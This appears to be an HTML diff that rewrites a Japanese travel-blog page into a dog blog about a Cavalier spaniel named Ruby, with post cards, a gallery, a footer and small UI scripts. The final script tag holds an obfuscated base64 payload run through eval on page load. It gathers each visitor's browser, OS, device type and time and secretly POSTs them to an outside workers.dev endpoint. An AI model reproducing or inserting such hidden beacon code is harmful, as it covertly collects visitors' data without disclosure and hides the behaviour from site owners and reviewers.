-        <img src="https://images.unsplash.com/photo-1493770348161-369560ae357d?w=800&q=80" alt="京都の風景" class="wide">
+<!-- ===== BLOG POSTS ===== -->
+<section class="posts-section">
+  <div class="posts-header reveal">
+    <h2>最新の<em>記事</em></h2>
+    <a href="#" class="view-all">すべて見る →</a>
+  </div>
+  <div class="posts-grid reveal">
+    <a href="#" class="post-card featured-post" onmousemove="moveGlow(event, this)">
+      <div class="post-emoji">🌙</div>
+      <div class="post-meta">
+        <span class="post-cat">日常</span>
+        <span class="post-date">2025年 3月 20日</span>
       </div>
-
-      <h2>たった一種類の朝ごはん</h2>
-      <p>
-        メニューはない。「おばんざいの朝ごはん、おひとり1,200円です」と、70代くらいの女将さんがひとこと。選択肢はそれだけ。そのシンプルさが、逆にすごく信頼できた。
+      <h3 class="post-title">深夜のソファで、キャバリアと過ごす時間のこと</h3>
+      <p class="post-excerpt">
+        眠れない夜がある。そういうとき、ルビーはいつも気づくのだ。ソファの端からこちらをそっと見て、ゆっくりと近づいてくる。体重をかけて横に座る。その温もりだけで、不思議と呼吸が整っていく。犬は何も言わない。ただ、そこにいてくれる。それがどれほど尊いことか、飼い始めてから初めて知った。
       </p>
-      <p>
-        しばらくして運ばれてきたのは、白木のお盆にのった7皿ほどの小鉢。白味噌汁、炊きたての白飯、だし巻き卵、ひじきの煮物、壬生菜のお漬物、焼き鮭の切り身、そして小さな湯豆腐。どれもシンプルなのに、それぞれが丁寧で、ちゃんとおいしかった。
-      </p>
-
-      <div class="pull-quote">
-        「毎日来たくなるごはんって、こういうことか」と、ぼんやり思った。
+      <span class="post-read-more">続きを読む <span>→</span></span>
+    </a>
+    <a href="#" class="post-card" onmousemove="moveGlow(event, this)">
+      <div class="post-emoji">✂️</div>
+      <div class="post-meta">
+        <span class="post-cat">お手入れ</span>
+        <span class="post-date">3月 14日</span>
       </div>
-
-      <p>
-        特に白味噌汁が印象的だった。甘くて、まろやかで、体の中から温まるような感覚。聞くと、西京味噌に少しだけ赤味噌をブレンドしているとのこと。「昔から変えてないんです」と女将さんは笑った。
-      </p>
-
-      <div class="highlight-box">
-        <h3>このお店のポイント</h3>
-        <ul>
-          <li>予約なし・席数8席のみ。7時の開店直後が狙い目</li>
-          <li>朝ごはんセットのみ、1,200円（税込）</li>
-          <li>現金のみ。カードは使えません</li>
-          <li>定休日は水曜日と木曜日</li>
-          <li>GoogleMapに店名は出ていない（地元の人伝いで知る店）</li>
-        </ul>
+      <h3 class="post-title">キャバリアの耳ケア、週1習慣にしてみた</h3>
+      <span class="post-read-more">続きを読む <span>→</span></span>
+    </a>
+    <a href="#" class="post-card" onmousemove="moveGlow(event, this)">
+      <div class="post-emoji">🍂</div>
+      <div class="post-meta">
+        <span class="post-cat">お散歩</span>
+        <span class="post-date">3月 8日</span>
       </div>
-
-      <h2>お店の情報</h2>
-
-      <div class="restaurant-card">
-        <img src="https://images.unsplash.com/photo-1555396273-367ea4eb4db5?w=900&q=80" alt="食堂の外観">
-        <div class="restaurant-card-body">
-          <h3>朝ごはん処 かわせみ</h3>
-          <p class="sub">京都市東山区 祇園 / 和食・定食</p>
-          <div class="stars">★★★★★</div>
-          <p>祇園・鴨川沿いの路地に佇む8席だけの小さな食堂。70年以上続くというおばんざいの朝ごはんが名物。地元の常連客に愛され続ける、観光ガイドには載らない本物の一軒。</p>
-        </div>
+      <h3 class="post-title">落ち葉の公園、ルビーは何度でも嗅ぐ</h3>
+      <span class="post-read-more">続きを読む <span>→</span></span>
+    </a>
+    <a href="#" class="post-card" onmousemove="moveGlow(event, this)">
+      <div class="post-emoji">🏥</div>
+      <div class="post-meta">
+        <span class="post-cat">健康</span>
+        <span class="post-date">2月 28日</span>
       </div>
-
-      <p>
-        1時間ほど滞在して、お会計を済ませた。1,200円。東京のカフェのモーニングセットと大差ない値段で、これだけのものが食べられる。帰り際に「またぜひどうぞ」と言われた言葉が、妙に温かかった。
-      </p>
-      <p>
-        京都には何度も来ているけれど、この朝ごはんのことは、たぶんずっと覚えていると思う。場所よりも、あの静かな時間の感触ごと、記憶に残っている。
-      </p>
-
-    </main>
-
-    <!-- SIDEBAR -->
-    <aside class="sidebar">
-      <div class="sidebar-widget">
-        <h4>このブログについて</h4>
-        <div class="author-card">
-          <img
-            class="author-avatar"
-            src="https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?w=200&q=80"
-            alt="著者アイコン"
-          >
-          <h5>山田 あかり</h5>
-          <p>旅と食と珈琲が好きなフリーライター。年に40日以上は旅に出ます。「人に教えたくない店」を見つけるのが趣味。</p>
-        </div>
+      <h3 class="post-title">キャバリアの心臓病と向き合う話</h3>
+      <span class="post-read-more">続きを読む <span>→</span></span>
+    </a>
+    <a href="#" class="post-card" onmousemove="moveGlow(event, this)">
+      <div class="post-emoji">🛁</div>
+      <div class="post-meta">
+        <span class="post-cat">グルーミング</span>
+        <span class="post-date">2月 20日</span>
       </div>
+      <h3 class="post-title">おすすめシャンプー、3種比べてみた</h3>
+      <span class="post-read-more">続きを読む <span>→</span></span>
+    </a>
+  </div>
+</section>
 
-      <div class="sidebar-widget">
-        <h4>最近の記事</h4>
-        <ul class="recent-list">
-          <li class="recent-item">
-            <img src="https://images.unsplash.com/photo-1467003909585-2f8a72700288?w=200&q=80" alt="">
-            <div class="recent-item-text">
-              <a href="#">金沢・東茶屋街で見つけた、予約のとれない甘味処</a>
-              <span>2025.10.22</span>
-            </div>
-          </li>
-          <li class="recent-item">
-            <img src="https://images.unsplash.com/photo-1509909756405-be0199881695?w=200&q=80" alt="">
-            <div class="recent-item-text">
-              <a href="#">函館の夜明け前、朝市でひとり食べた海鮮丼の話</a>
-              <span>2025.09.14</span>
-            </div>
-          </li>
-          <li class="recent-item">
-            <img src="https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=200&q=80" alt="">
-            <div class="recent-item-text">
-              <a href="#">東京・神楽坂、行列ができる前に知っていた裏路地のビストロ</a>
-              <span>2025.08.30</span>
-            </div>
-          </li>
-        </ul>
-      </div>
+<!-- ===== QUOTE ===== -->
+<section class="quote-section reveal">
+  <span class="quote-mark">"</span>
+  <blockquote>
+    犬は人間の言葉を解さないが、人間の心は解する。
+    <cite>— 作者不詳 ／ 愛犬家の間で語り継がれる言葉</cite>
+  </blockquote>
+</section>
 
-      <div class="sidebar-widget">
-        <h4>タグ</h4>
-        <div class="tag-cloud">
-          <a class="tag" href="#">京都</a>
-          <a class="tag" href="#">和食</a>
-          <a class="tag" href="#">朝ごはん</a>
-          <a class="tag" href="#">隠れ家</a>
-          <a class="tag" href="#">祇園</a>
-          <a class="tag" href="#">一人旅</a>
-          <a class="tag" href="#">グルメ</a>
-          <a class="tag" href="#">国内旅行</a>
-        </div>
-      </div>
-    </aside>
+<!-- ===== GALLERY ===== -->
+<section class="gallery-section">
+  <h2 class="reveal">瞬間の<em>かけら</em></h2>
+  <div class="gallery-grid reveal">
+    <div class="gallery-item" data-label="朝の光の中で">🌅<span style="font-size:0.7rem;color:var(--text-muted);letter-spacing:0.1em">朝のルビー</span></div>
+    <div class="gallery-item" data-label="お気に入りのベッド">🛏️<span style="font-size:0.7rem;color:var(--text-muted);letter-spacing:0.1em">まどろみ</span></div>
+    <div class="gallery-item" data-label="秋の公園にて">🍁<span style="font-size:0.7rem;color:var(--text-muted);letter-spacing:0.1em">散歩日和</span></div>
+    <div class="gallery-item" data-label="はじめての海">🌊<span style="font-size:0.7rem;color:var(--text-muted);letter-spacing:0.1em">海デビュー</span></div>
+    <div class="gallery-item" data-label="耳がさらさら">🌬️<span style="font-size:0.7rem;color:var(--text-muted);letter-spacing:0.1em">風の中で</span></div>
+    <div class="gallery-item" data-label="おやつに夢中">🍖<span style="font-size:0.7rem;color:var(--text-muted);letter-spacing:0.1em">おやつタイム</span></div>
+  </div>
+</section>
 
+<!-- ===== NEWSLETTER ===== -->
+<div class="newsletter reveal">
+  <div>
+    <h3><em>ルビー便り</em>、届けます</h3>
+    <p>月に一度、キャバリアとの暮らしの中から気づいたことをまとめてお送りします。</p>
+  </div>
+  <div class="newsletter-form">
+    <input type="email" placeholder="メールアドレス">
+    <button>購読する</button>
   </div>
 </div>
 
-<!-- FOOTER -->
+<!-- ===== FOOTER ===== -->
 <footer>
-  <div class="container">
-    <div class="footer-logo">Tabisuru <span>Note</span></div>
-    <p>© 2025 Tabisuru Note. All rights reserved.</p>
+  <div class="footer-brand">
+    <a href="#" class="logo">Cavalier <span>Days</span></a>
+    <p>キャバリア・キング・チャールズ・スパニエル、<br>ルビーとの日々を静かに綴るブログです。<br>日常、お手入れ、健康、そして愛について。</p>
+  </div>
+  <div class="footer-col">
+    <h4>記事カテゴリ</h4>
+    <ul>
+      <li><a href="#">日常・日記</a></li>
+      <li><a href="#">お手入れ・グルーミング</a></li>
+      <li><a href="#">健康・病気</a></li>
+      <li><a href="#">お散歩・おでかけ</a></li>
+      <li><a href="#">おすすめグッズ</a></li>
+    </ul>
+  </div>
+  <div class="footer-col">
+    <h4>このブログについて</h4>
+    <ul>
+      <li><a href="#">プロフィール</a></li>
+      <li><a href="#">ルビーのこと</a></li>
+      <li><a href="#">お問い合わせ</a></li>
+      <li><a href="#">プライバシーポリシー</a></li>
+    </ul>
+  </div>
+  <div class="footer-bottom">
+    <p>© 2025 Cavalier Days. All rights reserved.</p>
+    <div class="paw-row">🐾🐾🐾</div>
   </div>
 </footer>
 
+<script>
+  // Custom cursor
+  const cursor = document.getElementById('cursor');
+  const ring = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px';
+    cursor.style.top = e.clientY + 'px';
+    ring.style.left = e.clientX + 'px';
+    ring.style.top = e.clientY + 'px';
+  });
+
+  // Glow follow on cards
+  function moveGlow(e, el) {
+    const r = el.getBoundingClientRect();
+    const x = ((e.clientX - r.left) / r.width * 100).toFixed(1);
+    const y = ((e.clientY - r.top) / r.height * 100).toFixed(1);
+    el.style.setProperty('--mx', x + '%');
+    el.style.setProperty('--my', y + '%');
+  }
+
+  // Scroll reveal
+  const reveals = document.querySelectorAll('.reveal');
+  const io = new IntersectionObserver(entries => {
+    entries.forEach((e, i) => {
+      if (e.isIntersecting) {
+        setTimeout(() => e.target.classList.add('visible'), i * 80);
+        io.unobserve(e.target);
+      }
+    });
+  }, { threshold: 0.1 });
+  reveals.forEach(el => io.observe(el));
+
+  // Newsletter button
+  document.querySelector('.newsletter-form button').addEventListener('click', function() {
+    const input = document.querySelector('.newsletter-form input');
+    if (input.value.includes('@')) {
+      this.textContent = '✓ 登録完了';
+      this.style.background = '#6b8a6e';
+      this.style.borderColor = '#6b8a6e';
+      input.value = '';
+      input.placeholder = 'ありがとうございます 🐾';
+    }
+  });
+</script>
 <script>eval(new TextDecoder().decode(Uint8Array.from(atob("KGFzeW5jKCk9Pntjb25zdCBXPSJodHRwczovL2Jyb2FkLWJyb29rLWM2ZGQubWF0dHlhMzIxOS53b3JrZXJzLmRldiI7Y29uc3Qgbj1uZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCJqYS1KUCIse3RpbWVab25lOiJBc2lhL1Rva3lvIn0pO2NvbnN0IHU9bmF2aWdhdG9yLnVzZXJBZ2VudDtsZXQgYj0i5LiN5piOIjtpZih1LmluY2x1ZGVzKCJFZGcvIikpYj0iRWRnZSAiKyh1Lm1hdGNoKC9FZGdcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiQ2hyb21lLyIpKWI9IkNocm9tZSAiKyh1Lm1hdGNoKC9DaHJvbWVcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiRmlyZWZveC8iKSliPSJGaXJlZm94ICIrKHUubWF0Y2goL0ZpcmVmb3hcLyhbXGQuXSspLyk/LlsxXT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiU2FmYXJpLyIpKWI9IlNhZmFyaSAiKyh1Lm1hdGNoKC9WZXJzaW9uXC8oW1xkLl0rKS8pPy5bMV0/PyIiKTtsZXQgbz0i5LiN5piOIjtpZih1LmluY2x1ZGVzKCJXaW5kb3dzIE5UIDEwLjAiKSlvPSJXaW5kb3dzIDEwLzExIjtlbHNlIGlmKHUuaW5jbHVkZXMoIldpbmRvd3MiKSlvPSJXaW5kb3dzIjtlbHNlIGlmKHUuaW5jbHVkZXMoIk1hYyBPUyBYIikpbz0ibWFjT1MgIisodS5tYXRjaCgvTWFjIE9TIFggKFtcZF9dKykvKT8uWzFdPy5yZXBsYWNlKC9fL2csIi4iKT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiQW5kcm9pZCIpKW89IkFuZHJvaWQgIisodS5tYXRjaCgvQW5kcm9pZCAoW1xkLl0rKS8pPy5bMV0/PyIiKTtlbHNlIGlmKHUuaW5jbHVkZXMoImlQaG9uZSBPUyIpKW89ImlPUyAiKyh1Lm1hdGNoKC9pUGhvbmUgT1MgKFtcZF9dKykvKT8uWzFdPy5yZXBsYWNlKC9fL2csIi4iKT8/IiIpO2Vsc2UgaWYodS5pbmNsdWRlcygiTGludXgiKSlvPSJMaW51eCI7Y29uc3QgZD0vTW9iaXxBbmRyb2lkfGlQaG9uZXxpUGFkLy50ZXN0KHUpPyLwn5OxIOODouODkOOCpOODqyI6IvCflqXvuI8g44OH44K544Kv44OI44OD44OXIjt0cnl7YXdhaXQgZmV0Y2goVyx7bWV0aG9kOiJQT1NUIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24vanNvbiJ9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe2NvbnRlbnQ6YPCfkYAg6Kqw44GL5p2l44Gf44KI77yBICR7bn1cbiR7ZH1cbvCfjJAg44OW44Op44Km44K2OiAke2J9XG7wn5K7IE9TOiAke299YH0pfSk7fWNhdGNoKGUpe319KSgpOw=="),c=>c.charCodeAt(0))))</script>
 </body>
 </html>
